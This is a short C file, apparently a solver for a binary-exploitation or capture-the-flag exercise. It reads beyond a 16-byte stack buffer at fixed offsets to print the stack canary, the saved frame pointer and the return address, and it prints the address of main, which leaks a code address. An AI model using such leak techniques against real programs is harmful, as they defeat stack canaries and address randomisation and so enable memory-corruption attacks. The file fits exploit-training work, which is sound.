#include <stdio.h>

typedef int (*printf_ptr_t)(const char *format, ...);

void solver(printf_ptr_t fptr) {
	char msg[16] = "hello, world!";
	// fptr("[msg]: %p\n", msg);
	// fptr("[canary]: %p\n", msg + 0x18);
	fptr("%lu\n", *(unsigned long*)(msg + 0x18));
	// fptr("[$rbp]: %p\n", msg + 0x20);
	fptr("%lu\n", *(unsigned long*)(msg + 0x20));
	// fptr("[ra]: %p\n", msg + 0x28);
	fptr("%lu\n", *(unsigned long*)(msg + 0x28));
	// fptr("[magic]: %p\n", msg + 0x3c);
}

int main() {
	char fmt[16] = "** main = %p\n";
	printf(fmt, main);
	solver(printf);
	return 0;
}